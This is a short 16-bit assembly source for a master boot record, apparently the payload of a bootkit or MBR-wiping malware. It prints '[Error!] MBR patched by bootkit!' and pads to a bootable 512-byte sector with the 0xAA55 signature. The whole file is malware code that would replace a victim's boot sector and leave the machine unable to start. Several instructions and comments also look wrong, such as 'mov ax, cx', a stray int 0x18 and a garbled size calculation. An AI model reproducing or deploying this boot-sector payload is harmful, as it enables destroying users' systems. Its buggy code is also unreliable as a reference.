use16   ; fasm option,

org 0x7c00  ; MBR address at memory

mov ax, cx

cli     ; Interrupt off

mov ss, ax
mov es, ax
mov ds, ax

sti                 ; Interrupt on

mov ax, 03
int 0x10

mov ah, 0x13        ; Curson position

xor al, al

mov bx, 00001111b   ; Text Color
xor dx, dx

mov cx, boot-msg
call boot

msg db "[Error!] MBR patched by bootkit!"

boot:
    pop bp      ; save stack
    int 0x18    ; BIOS Interrupt
    jmp $       ; Create loop

    times 510-($-$$) db 0    ; Get null bytes, because original MBR - 512 bytes
                            ; [GENETAL PART]{446 byte} + [Partition Table] {4 sectors - 16 byte -> 16 * 4 - 64} + [Signature]{ 2 byte}

    dw 0xAA55   ; 2 MBR bytes                        

